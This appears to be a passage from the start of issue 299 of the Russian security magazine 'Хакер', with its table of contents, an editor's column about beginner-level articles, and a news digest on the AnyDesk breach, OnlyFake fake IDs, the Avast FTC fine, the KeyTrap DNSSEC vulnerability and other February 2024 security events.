
            № 299
CONTENTS


    Те самые инъекции
  Колонка главреда

    MEGANews
  Самые важ ные события в мире инфосека за февраль

    Ослепить Sysmon
  Выводим мониторинг из строя максимально незамет но

    Ослепить Sysmon полностью
  Ма нипу лиру ем объектами ETW, чтобы обойти мониторинг

     Detection-as-Сode
  Строим пайплайн для конфига Sysmon

    Вызывайте санитайзер
  Фаззим исполняемые файлы при помощи AFL++ с санитайзерами

    Проблемы с CVE
  Ра зоблачаем баги-пус тышки и пишем эксплоит при помощи ChatGPT

    Мыльная история
  Как я нанял зло го хакера для взло ма электрон ной поч ты

    SQL-инъекции
  Разбираем на пальцах одну из самых популярных хакерских техник

    HTB Drive
  Повыша ем привилегии через собствен ный модуль SQLite

    HTB RegistryTwo
  Эксплуатируем уязвимос ти Java RMI для полного захвата хоста

    HTB Visual
  Зах ватыва ем сервер на Windows через про ект Visual Studio

    HTB Keeper
  Собира ем мастер-пароль KeePass из дампа памяти процесса

    Выносим мозг
  Как работают экс пло иты социальной инженерии

    Спайварь на C#
  Как устроены средства слежения за пользователями

    Под капотом у PassMark
  Исследуем популяр ный бен чмарк и пишем свои тес ты

    Мегасчеты
  Собира ем мощ ный компьютер для вычис лений

    Титры
  Кто дела ет этот журнал
HEADER





Недавно в «Хакере» вышла статья,  пос‐
вященная  основе  основ  веб‑безопас‐
ности — SQL-инъекциям. Возможно, кто‑то
заметил мое присутствие в комментариях
под ней, и это неспроста. Для меня ее пуб‐       Андрей Письменный                                                                                      Главный редактор
ликация — одно из важнейших событий         apismenny@gmail.com
в «Хакере» за последнее время.


У нас в редакции давно идет неспешный спор о том, стоит ли делать статьи
начального уровня. В смысле совсем‑совсем базового. Пресловутая «кавыч‐
ка» в этих разговорах обычно используется как собирательный образ чего‑то,
что уважающий себя хакер знает с пеленок.
  Тем не менее запрос от читателей на такие статьи огромный, и стоит опуб‐
ликовать лайтовый материал, как счетчик просмотров на нем начинает кру‐
титься с непривычной бодростью. Да и в комментариях постепенно появ‐
ляются благодарности от людей, для которых обычные наши статьи слож‐
новаты, а такая — в самый раз.
   Примеров множество. Вспомнить хотя бы серию Ивана Сараева «Python
с абсолютного нуля», или наш с Валентином труд «Linux за 30 минут», который
мы накатали в качестве вступления к сборнику «Linux для Хакера», или, нап‐
ример, статью «Цифровая электроника с самого начала».
   Однако пытаться заказать такой материал кому‑то из наших постоянных
авторов — то еще мучение, к тому же зачастую напрасное. Я раз за разом
убеждаюсь, что никто не желает разжевывать базовые темы, а некоторые
авторы вообще не согласны писать, пока не подготовят действительно уни‐
кальный ресерч. Похвально, но кто более простую работу‑то делать будет?!
   Я, впрочем, не сдавался и пробовал подбивать на это новых авторов.
В конце прошлого года мне написал парень с ником Sphinx и предложил
серию статей про хакерские фреймворки. Первым результатом нашего сот‐
рудничества стала статья «Краткий экскурс в Metasploit». Вдохновившись
успехом, следом мы подготовили ту самую статью о «кавычке».





  Статью иллюстрирует самая кавайная кавычка на свете, чтобы смягчить
  сердца хейтеров

Когда нельзя взять новизной или уникальностью материала, остаются другие
козыри: подробность, доступность изложения и актуальность информации.
На некоторые популярные темы в интернете написаны километры текстов,
но выискивать понятную и актуальную инфу в них иногда приходится по кру‐
пицам. Наша задача — изложить всё так, чтобы делать этого не пришлось.
  А еще между покупкой бумажного журнала и подпиской на Xakep.ru есть
важная разница. Оплатив доступ к платным статьям на  сайте, читатель
получает их все, а это более полутора тысяч материалов.
   Публикуя статьи с пометкой «для новичков», мы преследуем две важные
цели: сиюминутную — сделать популярный материал — и глобальную — соз‐
дать библиотеку, которая бы покрывала каждую из основных наших тем
от начала до конца.
   Журнал «Хакер» просто обязан писать много и часто про такие вещи,
как Burp Suite или Kali Linux. При этом темы номера про Kali у нас до сих пор
почему‑то ни разу не было. И я догадываюсь почему. Сначала некому было
поручить (все ведь хотят публиковать свои ресерчи, а не обзоры), а потом
уже вроде бы и писать не о чем, ведь кажется, что все и так всё знают о Kali.
Впрочем, даже если бы тогда написали, обзор десятилетней давности вряд
ли сейчас будет смотреться свежо и привлекательно.
  Мы будем постепенно восполнять эти пробелы, а затем попробуем струк‐
турировать материалы на сайте так, чтобы не приходилось листать полторы
тысячи статей в поисках текста нужного уровня и на нужную тему. Подборки
статей — это, кстати, один из подходов к проблеме.





В общем, встретив в «Хакере» лайтовую статью, не спеши хвататься за мон‐
тировку. На одного тебя приходится как минимум трое читателей, которым
этот текст поможет потихоньку достичь твоих вершин мастерства, глубин муд‐
рости и ширин кругозора.
  Да и хардкорные статьи ведь никуда не денутся. У нас есть железное пра‐
вило: никогда не отказывать в публикации, если тема крутая, но слишком
узкоспециализированная. Пускай это будет мощная статья для пары десятков
человек. Ничего страшного, остальные хотя бы впечатлятся и положат в зак‐
ладки.
   Кстати, если хочешь помочь нам закрывать дыры в описании основных
хакерских техник и инструментов, обращайся. Работы — сколько угодно. Ну
а с крутым ресерчем обращайся тем более! Моя почта (pismenny@glc.ru)
и Telegram всегда открыты для новых авторов.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: хакеры украли у AnyDesk исходный код и сер‐
тификаты  подписи  кода,  обнаружен  сервис  OnlyFake,
генерирующий  фальшивые  документы,  правоохранители
хакнули инфраструктуру группировки LockBit, Avast оштра‐
фовали за торговлю данными пользователей, для Flipper
Zero вышел новый модуль, а  также  другие  интересные
события февраля.





ХАКЕРЫ ВЗЛОМАЛИ
ANYDESK
В AnyDesk заявили, что недавно компания подверглась кибератаке и хакерам
удалось получить доступ к ее производственным системам. По данным СМИ,
в итоге злоумышленники украли исходный код и сертификаты подписи кода.
При этом официальное заявление гласит, что речь идет не о вымогательской
атаке и расследованием случившегося уже занимаются правоохранительные
органы и эксперты ИБ‑компании CrowdStrike.
   Известно, что после обнаружения взлома AnyDesk отозвала все связан‐
ные с безопасностью сертификаты, а также восстановила или заменила ряд
систем. В компании заверили: AnyDesk полностью безопасен для клиентов
и нет никаких доказательств того, что устройства конечных пользователей
пострадали в результате инцидента.
   Представители AnyDesk не сообщают никаких подробностей  случив‐
шегося, но СМИ, со ссылкой на собственные источники, отметили, что зло‐
умышленники похитили у компании исходники и сертификаты подписи кода.
    Хотя компания утверждает, что аутентификационные токены не были укра‐
дены, в качестве меры предосторожности AnyDesk сбросила пароли к своему
веб‑порталу my.anydesk[.]com и рекомендовала клиентам как можно скорее
сменить пароли, если они повторно использовались на других сайтах.


      «AnyDesk  спроектирован таким  образом,  что  аутентификационные
      токены   сессий  невозможно   украсть.  Они   существуют   только«
      на устройстве конечного пользователя и связаны с профилем его
       устройства. Эти токены  никогда не  контактируют с нашими  сис-
      темами, — сообщают в AnyDesk. — Мы не обнаружили признаков
       перехвата сессий, потому что это невозможно».                »
В свою очередь, журналисты отметили, что компания уже начала замену укра‐
денных сертификатов подписи кода: Гюнтер Борн (Günter Born) из BornCity
первым  заметил,  что  в  версии AnyDesk  8.0.8,  выпущенной 29  янва‐
ря 2024 года, используется новый сертификат. Старые исполняемые файлы
были   подписаны  именем   philandro   Software  GmbH  с  серийным
номером 0dbf152deaf0b981a8a938d53f769db8. Новая версия же подписана
AnyDesk          Software       GmbH          с          серийным
номером 0a8177fcd8936a91b5e0eddf995b0ba5.





Специалисты ИБ‑компании Resecurity заметили, что двое злоумышленников
(один из которых использует ник Jobaaaaa) рекламируют на хакфоруме Exploit
продажу  учетных  данных  клиентов  AnyDesk.  Jobaaaaa  пишет,  что  эту
информацию можно использовать для «скама и рассылок». За информацию
о 18 317 аккаунтах продавец надеется выручить 15 тысяч долларов США
в криптовалюте.

       «Примечательно,  что  временные  метки на  скриншотах,  которыми
       поделился злоумышленник, свидетельствуют об успешном несанкци-«
       онированном доступе 3 февраля 2024 года (то есть уже после раскры-
      тия инцидента)», — говорят исследователи.                »





Неясно, каким именно образом была получена эта информация, но, по мне‐
нию  Resecurity,  киберпреступники попытались поскорее  монетизировать
учетные данные клиентов, зная о скором сбросе паролей.


УТЕКЛИ 510 МИЛЛИОНОВ ЗАПИСЕЙ О РОССИЯНАХ
По данным Роскомнадзора, с начала 2024 года было зафиксировано 19 случаев утечки пер‐
сональных данных и в сеть попали более 510 миллионов записей о россиянах.

Особенно в ведомстве выделили один инцидент, в результате которого произошла утечка
500 миллионов записей. О какой утечке идет речь и с какой именно организацией она может
быть связана, в ведомстве пока не уточняют, ссылаясь на ведущееся расследование.





ONLYFAKE
ГЕНЕРИРУЕТ
ФАЛЬШИВЫЕ
ДОКУМЕНТЫ
Журналисты издания 404 Media обнаружили сервис OnlyFake, который заяв‐
ляет, что использует нейросети и ИИ для создания поддельных удостовере‐
ний личности. Исследователи протестировали OnlyFake и успешно прошли
проверку KYC (Know Your Customer) на нескольких криптовалютных биржах.
   OnlyFake  генерирует  реалистичные  поддельные  водительские  права
и паспорта для 26 стран, включая Россию, США, Канаду, Великобританию,
Австралию и ряд стран ЕС, и принимает оплату в нескольких криптовалютах.
При этом цена одного фейка составляет всего 15 долларов США.
   Также сервис предлагает клиентам сделать подделки еще более убе‐
дительными.  Например,  изменить  метаданные  изображения,  ведь  эту
информацию могут просматривать сервисы для проверки личности или люди.
Так, можно указать, каким устройством якобы была сделана фотография
(Apple iPhone 11 Pro, Huawei BKL-L09), дату и время ее создания, а также под‐
делать GPS-координаты.





Пользователи могут не только загрузить собственную фотографию, но и выб‐
рать из множества готовых фото из архива OnlyFake. Причем сообщается, что
эти снимки не сгенерированы искусственным интеллектом.

       «Эпоха отрисовки документов с использованием фотошопа подходит
       к концу. Представляю вам генератор документов 3.0 — Onlyfake. Он«
       разрабатывался почти полтора года», — гласит реклама в Telegram-
      канале OnlyFake.                »
Сервис утверждает, что использует специальные «генераторы», которые соз‐
дают до 20 тысяч документов в день. К тому же его владелец, известный
под ником John Wick, сообщил изданию, что сотни документов могут быть
созданы одновременно с помощью заготовленных данных из таблиц Excel.
По его словам, создавать шаблоны документов он начал около трех лет
назад, а сам сервис‑генератор OnlyFake, согласно Telegram-каналу, находит‐
ся в разработке «почти полтора года».
   Исследователи рассказали, что на данный момент биткоин‑адрес, связан‐
ный с OnlyFake, получил криптовалюту на сумму более 23 500 долларов.
Однако сервис принимает и другие криптовалюты, поэтому доходы его опе‐
раторов явно превышают эту сумму.
   Также John Wick заявил, что сгенерированные сервисом документы могут
использоваться для обхода проверок на таких сайтах и биржах, как Binance,
Revolut, Wise, Kraken, Bybit, Payoneer, Huobi, Airbnb, OKX и Coinbase. И это
подтверждают пользователи, которые делятся в Telegram своими успехами
в использовании поддельных документов для обхода проверок на различных
криптобиржах и сервисах.
   Сооснователь 404 Media Джозеф Кокс (Joseph Сox) проверил эти утвер‐
ждения операторов OnlyFake лично, создав при помощи сервиса фальшивый
британский паспорт со своей фотографией и калифорнийские водительские
права. Эти фальшивки действительно позволили журналисту пройти KYC-
проверки на криптовалютной бирже OKX.

      «Для мошенников привлекательность такого сервиса, как OnlyFake,
       заключается в том, что эти якобы сгенерированные ИИ поддельные«
      документы могут использоваться для регистрации в онлайн‑сервисах,
      которые запрашивают проверку личности. Разного рода сайты (банки,
       криптовалютные  биржи) или даже  отдельные  специалисты  (такие
       как юристы или бухгалтеры) очень часто запрашивают как минимум
      скан или фото удостоверения личности. Некоторые социальные сети
      в определенных обстоятельствах тоже могут запрашивать документы,
      удостоверяющие личность», — пишет Кокс.                »
Интересно, что вскоре после публикации исследования Кокса в Telegram-
канале появилось заявление от операторов сервиса, которые утверждают,
что сообщения об использовании OnlyFake для подделки документов —
это фейк и «полная чушь»:


      «В новостях пишут, что наш генератор используется для подделки
       документов.  Это  полная  чушь.  Такого  никогда  не  случалось.«
      Как минимум потому, что он не может быть использован для подделки
       документов, — гласит сообщение. — Хотим напомнить, что мы против
      любого   незаконного   использования   изображений,   созданных
      с помощью нашего сайта. Мы против мошенничества и причинения
       вреда другим людям. Все сгенерированные изображения на сайте
       предназначены только для легального использования».                »
Также в Telegram сообщалось, что вскоре генератор обзаведется провер‐
ками «для противодействия незаконной деятельности».


21,3 МИЛЛИАРДА ПИСЕМ С ВРЕДОНОСНЫМ СПАМОМ


Аналитики Яндекс 360 обнаружили тенденцию к снижению количества спама в почте. Так,
в 2023 году его отправили на треть (на 8,6 миллиарда писем) меньше, чем в 2019 году.
При этом исследователи пишут, что уловки мошенников стали изощреннее в части как кон‐
тента, так и технологий, помогающих замаскировать спам под обычное письмо.

В прошлом году Яндекс 360 обработал свыше 97 миллиардов входящих писем, из них
21,3 миллиарда оказались вредоносным спамом, от которого защитили получателей.





Наиболее массовыми рассылками стали письма с PDF-вложениями, в которых могли содер‐
жаться вредоносные ссылки (1,5 миллиарда).

Также были популярны предложения пройти обучение  (582 миллиона), письма с розыг‐
рышами, обещаниями призов и предложениями попытать  удачу  (475 миллионов),  спу‐
финг‑атаки, замаскированные под письма от известного магазина или компании (462 мил-
лиона), а также письма с фальшивыми предложениями работы (324 миллиона).

Наиболее активны спамеры оказались весной, в начале осенних распродаж, а также под Новый
год. Менее активны спамеры в начале года и на старте бизнес‑сезона (конец августа — начало
сентября).





ТРЕБОВАНИЯ
ДЛЯ WINDOWS 11
ОБНОВИЛИ
Хотя исходно Windows 11 имела весьма серьезные системные требования,
на сегодня пользователи научились успешно обходить почти все сложности
и практически ничто не препятствует запуску Windows 11 на старом железе.
Однако теперь ситуация может измениться из‑за малоизвестной инструкции
под названием POPCNT.
   Как все знают, Windows 11 может работать практически на любом 64-раз‐
рядном ПК, на котором запускается Windows 10, и ее успешно устанавливали
на старые машины времен Windows XP, построенные на Core 2 Duo.
  Но ситуация меняется в Windows 11 24H2, которую Microsoft начала тес‐
тировать в феврале 2024 года. Последние сборки Windows 11 отказываются
загружаться  на  старых  процессорах,  не  поддерживающих  инструкцию
POPCNT (Population count), которая используется для «подсчета количества
битов в машинном слове».
   Неясно, почему POPCNT вдруг стала необходимой, но похоже, что ядро
Windows, сетевые и USB-драйверы, а также другие основные системные фай‐
лы в Windows 11 24H2 теперь требуют ее использования.
  В современных x86-процессорах POPCNT входит в набор инструкций
SSE4. Так, в процессорах Intel инструкция появилась как часть SSE4.2 в Core
первого поколения (архитектура Nehalem). В процессорах AMD она включена
в состав SSE4a и впервые была добавлена в Phenom, Athlon и Sempron
на базе архитектуры K10. Эти архитектуры вышли в 2007 и 2008 годах.
   Таким образом, старые системы 2000-х годов, времен Intel Core 2 Duo
и Athlon 64, лишаются возможности работать с Windows 11 (которая, впрочем,
никогда не поддерживалась для них официально).
   Конечно, эти изменения в основном затронут любителей ретрокомпьюте‐
ров, а не пользователей реальных систем, а энтузиасты, вероятно, со вре‐
менем найдут способ обойти новое ограничение. Также стоит отметить, что
сборки Insider — это не финальный продукт, и ситуация может измениться
в будущем, когда 24H2 станет общедоступной.
    Хотя в системных требованиях Windows 11 перечислены тактовая частота
процессора, объем оперативной памяти, параметры накопителя и так далее,
на деле системные требования давно стали более сложными. Например,
похоже, что требования Windows 11 к процессору (Intel Core 8-го поколения
или новее либо AMD Ryzen 2000-й серии или новее) частично обусловлены
необходимостью поддержки защитной функции mode based execution control
(MBEC),  которая  улучшает  некоторые  механизмы защиты  целостности
памяти. Но ни один производитель не упоминает в своих рекламных матери‐
алах POPCNT или MBEC, а работа Windows в современных условиях зачастую
зависит именно от таких функций.


НОВЫЙ ФОРК NGINX





Максим Дунин, один из трех ключевых разработчиков Nginx, объявил, что создает собственный
форк проекта — FreeNginx. Дунин объясняет, что нетехнический менеджмент F5 начал вме‐
шиваться в политику безопасности Nginx и теперь проект уже нельзя рассматривать как сво‐
бодный проект с открытым исходным кодом.

          «К сожалению, новое нетехническое руководство F5 недавно решило, что→      оно лучше знает, как управлять проектами с открытым исходным кодом. В час‐
        тности, они решили вмешаться в политику безопасности, которую Nginx исполь‐
       зует уже много лет, игнорируя как саму политику, так и позицию разработчиков.
      Это вполне объяснимо: они владеют проектом и могут делать с ним все, что
        захотят, в том  числе  предпринимать  маркетинговые  действия,  игнорируя
      позицию разработчиков и сообщества. Тем не менее это противоречит нашему
       соглашению. И, что более важно, я более не могу контролировать изменения,
       вносимые в Nginx внутри F5, и более не рассматриваю Nginx как свободный
        проект с открытым исходным кодом, разрабатываемый и поддерживаемый
       для общего блага», — объяснил Дунин в своем сообщении.





ДЛЯ FLIPPER ZERO
ВЫШЕЛ МОДУЛЬ
VIDEO GAME
Создатели Flipper Zero совместно с Raspberry Pi разработали новый модуль
Video Game. Он предназначен не только для игр: модуль также позволяет
подключить Flipper Zero к телевизору, использовать его как осциллограф,
управлять курсором в различных приложениях и так далее.
   Новый модуль построен на разработке Raspberry Pi — микроконтроллере
RP2040 (таком же, как в Raspberry Pi Pico). Создатели Flipper рассказывают,
что немного разогнали его, «чтобы он мог генерировать видеосигнал».
Это позволило оснастить модуль портом для подключения к телевизору
и дублирования экрана Flipper. Также девайс получил датчик отслеживания
движений, который может использоваться в играх и приложениях.


ТЕХНИЧЕСКИЕ ХАРАКТЕРИСТИКИ МОДУЛЯ
Микроконтроллер: Raspberry  Pi RP2040 на двухъядерном процессоре ARM Cortex-M0+
(до 133 МГц).

Оперативная память: 264 Кбайт SRAM.

Гироскоп и акселерометр: TDK ICM-42688-P — 6-осевой MEMS-датчик отслеживания дви‐
жений (IMU).

Порт USB Type-C: работает как USB-устройство или хост (с ограничениями, так как USB power
delivery не поддерживается).

Порт видеовыхода: сигнал DVI-D в разрешении 640 × 480, 60 Гц, через HDMI (разработчики
пишут про «известный видеостандарт», который нельзя называть из‑за ограничений по автор‐
ским правам, и намекают: первая буква — H, последняя — I).

GPIO: 11 контактов GPIO, подключенных к RP2040, два контакта заземления и один контакт
для питания (3,3 В).

Кнопка Boot: активирует режим загрузчика (для разработчиков).

Кнопка Reset: перезагружает железо модуля.



Порт видеовыхода можно использовать, например, для отображения перех‐
ваченных данных на большом экране. Подчеркивается, что, невзирая на тот
факт, что оригинальное разрешение экрана Flipper Zero составляет все‐
го 128 на 64 пикселя, изображение на экране ТВ выглядит четко и хорошо.
Гироскоп и акселерометр можно использовать как для игр, так и для более
практичных задач, например для управления компьютером.


                                     Продолжение статьи →
← Начало статьи





   Датчик отслеживания движений также может применяться в разных приложе‐
   ниях и играх. При этом датчик доступен не только для микроконтроллера
  модуля Video Game: его SPI-контакты выведены на разъем Flipper Zero. То
   есть датчик может напрямую использоваться приложениями, работающими
  на Flipper Zero, например Air Mouse.
     Кроме того, датчик подключен к микроконтроллеру Raspberry Pi RP2040.
  Это означает, что доступ к датчику имеют и прошивка модуля, и приложения,
  работающие на Flipper Zero. Однако датчик не может одновременно исполь‐
   зоваться модулем и Flipper Zero из‑за ограничений SPI.
      Стоит отметить, что для облегчения разработки будущих игр для Flipper
   Zero компания уже опубликовала игровой движок Flipper Zero Game Engine.
  В движок включен драйвер датчика отслеживания движения (ICM-42688-P),
  который можно использовать в играх, поддерживающих модуль Video Game.
      Прошивка и все схемы, как обычно, полностью открыты, и разработчики
   говорят, что уже с нетерпением ждут идей от сообщества.
      Пока модуль  Video Game  доступен  только  для США и  стран ЕС
  по цене 49 долларов США. В компании обещают, что в ближайшее время
   появится доставка и в другие регионы через партнеров‑дистрибьюторов.


 ФИШЕРЫ ПИШУТ ПО ВТОРНИКАМ

    Аналитики FACCT перечислили основные тренды в области вредоносных почтовых рассылок.
   Вторник стал самым популярным у злоумышленников днем недели для отправки фишинговых
   писем (19,7% от всех писем за неделю), а почти 98% обнаруженных в рассылках вредоносов
   были спрятаны во вложениях.

   Самой распространенной «упаковкой» для малвари остаются .rar  (23,3%), .zip  (21,1%), .z
     (7,7%).





    Наиболее распространенными вредоносами в письмах стали спайварь Agent Tesla (обнаружена
   в 39,4% вредоносных рассылок), а также стилеры FormBookFormgrabber (22,4%) и Loki PWS
     (7,4%).





 AVAST
 ОШТРАФОВАЛИ
   Федеральная  торговая комиссия США  (FTC) обвинила компанию  Avast
   в нарушении прав миллионов потребителей. Речь идет о незаконном сборе
   пользовательских данных с помощью расширений для браузеров и анти‐
   вирусного ПО, а также последующей «продаже этих данных без надлежащего
   уведомления и согласия потребителей».
     FTC сообщила, что Avast будет оштрафована на 16,5 миллиона долларов
  США, а также обязана прекратить продажу и передачу любых данных поль‐
   зователей в рекламных целях.
     Как утверждают представители американского регулятора, чешский про‐
   изводитель антивирусов обманывал пользователей, уверяя, что ПО Avast
  защищает их конфиденциальность, хотя на самом деле  продукты Avast
  не информировали людей о том, что сами собирают и продают их данные,
  с помощью которых можно идентифицировать конкретного человека.
      Документы гласят, что Avast хранила данные пользователей в течение
   неопределенного времени и продала их более чем 100 третьим сторонам
  через свою дочернюю компанию Jumpshot. Комиссия заявляет, что Avast спе‐
   циально приобрела эту фирму, провела ребрендинг и превратила ее в ана‐
   литическую компанию, которая торговала собранной Avast информацией
  с рекламными, маркетинговыми и аналитическими организациями, а также
   брокерами данных.

         «Объем  данных, которые  распространила  Avast,  просто  поражает:
         в документах утверждается, что к 2020 году Jumpshot накопила более «
          восьми петабайт браузинговой информации», — сообщают в FTC.                 »
   Напомним,  что  впервые  об  этой  практике  Avast   стало  известно
  еще в 2020 году, когда журналисты Vice Motherboard и PCMag уличили Avast
   в тайном сборе пользовательских данных, которые затем перепродавались
  таким гигантам, как Google, Yelp, Microsoft, McKinsey, Pepsi, Sephora, Home
   Depot, Condé Nast, Intuit, и многим, многим другим.
      Вскоре после публикации этого журналистского расследования Avast объ‐
   явила о ликвидации Jumpshot, хотя тогда подчеркивалось, что Jumpshot всег‐
  да действовала как независимая компания с собственным руководством
  и советом директоров.
     Данные пользователей, которые Avast собирала и продавала третьим
  лицам как минимум с 2014 года, включали в себя информацию о поисковых
   запросах людей и посещаемых ими страницах, раскрывали религиозные
   убеждения, данные о состоянии здоровья,  политических  взглядах, мес‐
   тоположении, финансовом положении, посещении контента, ориентирован‐
  ного на детей, и так далее.
     Несмотря на заявления Avast о том, что перед продажей компания исполь‐
  зовала специальные инструменты для удаления любой идентификационной
  информации, власти утверждают, что компания не обеспечивала достаточную
   анонимизацию данных. К примеру, среди них можно было обнаружить уни‐
   кальные идентификаторы браузеров, из которых собиралась информация,
   детальные сведения о посещенных человеком сайтах, точные временные
   метки, тип устройства и браузера, а также информацию о городе, штате
  и стране проживания пользователя.
      Теперь компании Avast не  только  придется заплатить штраф в раз‐
  мере 16,5 миллиона долларов: ей будет запрещено распространять и про‐
   давать третьим лицам в рекламных целях данные, собранные с помощью про‐
   дуктов под брендом Avast. Также компания будет обязана получать согласие
   от всех клиентов, прежде чем продавать и распространять их данные, соб‐
  ранные с помощью продуктов, не относящихся к Avast.
     Кроме того, FTC требует от Avast удалить все накопившиеся за долгие
  годы данные, переданные Jumpshot, а также все продукты и алгоритмы, раз‐
   работанные Jumpshot с использованием этой информации.
      Представители Avast сообщили СМИ, что компания уже достигла сог‐
  лашения с Федеральной торговой комиссией:


         «Компания Avast заключила мировое соглашение с FTC, чтобы уре-
          гулировать расследование, касающееся предоставления данных кли- «
         ентов дочерней компании Jumpshot, которую Avast добровольно зак-
        рыла в январе 2020 года. Мы привержены нашей миссии — защите
        и расширению  возможностей людей в цифровом мире. Хотя мы
        не согласны с претензиями FTC и их изложением фактов, мы рады
         разрешить этот вопрос и надеемся и далее предоставлять  услуги
         миллионам наших клиентов по всему миру».                 »

  36,88% ВСЕХ DDOS-АТАК ПРИШЛОСЬ НА СФЕРУ
 ФИНАНСОВ

   Специалисты Qrator Labs подвели итоги 2023 года. Выяснилось, что 36,88% всех DDoS-атак
   пришлось на сферу финансов.

   Вторым самым атакуемым сегментом оказалась электронная коммерция с долей 24,95%. Так‐
   же в топ-5 самых атакуемых вошли сегменты образовательных технологий, онлайн‑гей-
   минга и ИТ и телекома.





                                            Атаки на уровне микросегментов


   Самой продолжительной непрерывной DDoS-атакой года стал инцидент в третьем квартале:
   была атакована компания в сегменте аэропортов. Эта мультивекторная атака (UDP- + SYN- +
   TCP-флуд) длилась почти три дня (71,58 часа), с 24 по 27 августа 2023 года.





                                  Самые распространенные векторы атак


    Также отмечается, что четвертый квартал прошлого года стал пиковым периодом по уровню
   активности ботов. Его показатели почти в два раза превысили количество атак ботов в первом
    квартале, увеличившись с 3 027 064 142 до 5 028 223 169 запросов. В сравнении с третьим
   кварталом число атак ботов возросло на 32%.

   При этом весь год росла доля онлайн‑ретейла в общем количестве бот‑активности, в итоге уве‐
   личившись с 16% до почти 30%. Аналитики связывают это с ростом интереса ботоводов
   к данной сфере и повышением общего фона бот‑активности.





 KEYTRAP НАЗВАЛИ
 ХУДШЕЙ ИЗ ВСЕХ
 DNS-АТАК
   Группа исследователей обнаружила связанную с DNS уязвимость (CVE-2023-
   50387), получившую название KeyTrap. По словам исследователей, эта проб‐
  лема способна вывести из строя значительную часть интернета.
      Уязвимость описывается как критический недостаток в структуре Domain
  Name System Security Extensions (DNSSEC) — наборе расширений протокола
  DNS. DNSSEC позволяет гарантировать достоверность и целостность дан‐
   ных, а  также минимизировать  атаки,  связанные с подменой  IP-адреса
  при разрешении доменных имен. Фактически цель DNSSEC — предотвратить
   «отравление» ответов на DNS-запросы и манипулирование ими.
   О проблеме сообщили специалисты из немецкого Национального иссле‐
   довательского  центра  прикладной  кибербезопасности  ATHENE,  Дарм‐
   штадтского технического университета, Франкфуртского университета имени
   Иоганна Вольфганга Гёте и Fraunhofer SIT. Они предупреждают, что KeyTrap
   затрагивает все популярные имплементации и сервисы Domain Name System
   (DNS), а ее  эксплуатация может  вызвать перебои в работе интернета
   в целом. Причем для атаки понадобится всего один специально подготов‐
  ленный DNS-пакет, который спровоцирует истощение ресурсов процессора
  и длительный DoS.
    В отчете подчеркивается, что уязвимость оставалась незамеченной более
   двух десятилетий (с 1999 года), хотя нет никаких признаков того, что ею ког‐
  да‑либо пользовались хакеры. Также утверждается, что производители софта
  для DNS-серверов назвали эту проблему «худшей DNS-атакой из всех ког‐
  да‑либо обнаруженных».


           «Эксплуатация   KeyTrap   приведет   к   серьезным   последствиям
         для  любого  приложения,  использующего  интернет,  в  том  числе «
          к  недоступности таких  технологий, как веб‑браузинг,  электронная
           почта и обмен мгновенными сообщениями. С помощью KeyTrap зло-
         умышленник может полностью вывести из строя большую часть все-
         мирной сети», — рассказывают исследователи.                 »
   Сообщается, что атакам подвержены системы, использующие DNS-резол‐
  веры с валидацией DNSSEC. По данным исследователей, по состоянию
  на декабрь 2023 года такие резолверы использовали более 31% всех
   веб‑клиентов в мире.





   Исследователи объясняют, что проблема связана с требованием DNSSEC
   передавать все криптографические ключи для поддерживаемых шифров
  и соответствующие подписи для валидации. Процесс происходит одинаково,
  даже если некоторые ключи DNSSEC сконфигурированы неправильно, невер‐
  ны или относятся к шифрам, которые не поддерживаются.
      Вооружившись  этим  знанием,  эксперты  разработали  новый  класс
  DNSSEC-атак, связанных с алгоритмической сложностью, которые могут
   в 2 миллиона раз увеличить количество процессорных инструкций для DNS-
   резолверов, тем самым провоцируя отказ в обслуживании. Продолжитель‐
   ность такого DoS зависит от конкретной имплементации резолвера, но,
  по словам исследователей, один запрос атакующих способен вызвать задер‐
   жку ответа на время от 56 секунд до 16 часов.
      Специалисты подчеркивают, что KeyTrap может влиять на крупнейших пос‐
   тавщиков DNS-услуг, включая Google и Cloudflare. Поэтому еще в нояб‐
  ре 2023 года эксперты уведомили ряд компаний о найденной проблеме
  и совместно с ними разработали меры по ее устранению. В результате зат‐
  ронутые поставщики выпустили серию исправлений, последнее из которых
   вышло 13 февраля 2024 года.
       Хотя затронутые поставщики уже представили патчи и постарались сни‐
   зить  риски,  специалисты пишут, что  окончательное решение проблемы
   KeyTrap  может  потребовать  пересмотра  всей  философии  разработки
  DNSSEC и самого стандарта.
     Бюллетени безопасности, связанные с CVE-2023-50387, уже опубликова‐
  ли  Microsoft,  BIND,  PowerDNS,  NLnet,  Akamai.  Представители  Google
  и Cloudflare также подтвердили, что исправили уязвимость KeyTrap в своих
   системах и пользователям ничто не угрожает.
      Руководитель Akamai Свен Даммер (Sven Dummer) поблагодарил иссле‐
   довательскую  группу не только за само обнаружение уязвимости, но и
  за работу с DNS-провайдерами и производителями ПО.

         «Возможно, вы не знаете об этом, но глобальный интернет только что
           уклонился от пули: KeyTrap — это уязвимость в ключевой инфраструк- «
          туре, необходимой для функционирования всего интернета, и одна
         из самых страшных когда‑либо обнаруженных проблем», — считает
         Даммер.                 »

 73% ГЕЙМЕРОВ ПИРАТЯТ ИГРЫ
  В 2023 году российские геймеры скачали нелицензионные копии игр на сумму более 324 мил-
   лиардов рублей, говорят специалисты образовательной платформы XYZ School. Так, в прош‐
   лом году 73% запускали хотя бы одну пиратскую игру, тогда как в 2022 году их доля составля‐
   ла 69%.





  В исследовании учитывались все нелицензионные форматы игр, но большая часть из них приш‐
   лась на игры, скачанные с торрент‑трекеров. Самыми популярными среди пиратов играми ока‐
   зались Atomic Heart, Hogwarts Legacy и Baldur’s Gate 3.





 GOOGLE ЗАПРЕТИТ
 ОПАСНЫЕ
 ПРИВИЛЕГИИ
  Инженеры Google запустили пилотный проект по борьбе с финансовым
   мошенничеством: в Android будут автоматически блокироваться APK-файлы,
  запрашивающие доступ к опасным разрешениям.
     Как  правило, APK-файлы  распространяются через  сторонние  сайты
  и магазины приложений, что позволяет устанавливать приложения, минуя
   официальный магазин Google  Play. Так как на сторонних сайтах обычно
   отсутствуют какие‑либо проверки на безопасность и вредоносное поведе‐
   ние, APK могут содержать разнообразную малварь. Более того, злоумыш‐
   ленники нередко прибегают к социальной инженерии, убеждая жертву заг‐
   рузить и установить вредоносное приложение из внешних, недоверенных
   источников.
    По данным Google, в 2023 году из‑за мошенничества пользователи
   Android потеряли более триллиона долларов, причем 78% опрошенных сооб‐
  щали, что сталкивались хотя бы с одной попыткой скама.
    Еще в октябре 2023 года Google Play Protect получил новую защитную фун‐
